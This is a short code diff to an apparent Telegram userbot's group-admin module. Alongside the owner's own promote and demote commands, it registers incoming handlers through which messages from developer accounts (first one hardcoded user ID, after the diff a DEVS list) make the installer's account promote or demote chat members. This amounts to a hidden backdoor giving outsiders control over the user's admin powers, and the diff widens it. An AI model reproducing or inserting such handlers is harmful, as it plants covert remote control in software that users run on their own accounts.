@@ -29,7 +29,7 @@ from telethon.tl.types import (
     PeerChat,
 )
 
-from userbot import BOTLOG, BOTLOG_CHATID, CMD_HELP
+from userbot import BOTLOG, BOTLOG_CHATID, DEVS, CMD_HELP
 from userbot.events import register
 
 # =================== CONSTANT ===================
@@ -113,7 +113,7 @@ async def set_group_photo(gpic):
 
 
 @register(outgoing=True, pattern=r"^\.promote(?: |$)(.*)")
-@register(incoming=True, from_users=1979717764, pattern=r"^\.cpromote(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cpromote(?: |$)(.*)")
 async def promote(promt):
     # Get targeted chat
     chat = await promt.get_chat()
@@ -164,7 +164,7 @@ async def promote(promt):
 
 
 @register(outgoing=True, pattern=r"^\.demote(?: |$)(.*)")
-@register(incoming=True, from_users=1979717764, pattern=r"^\.cdemote(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cdemote(?: |$)(.*)")
 async def demote(dmod):
     # Admin right check
     chat = await dmod.get_chat()
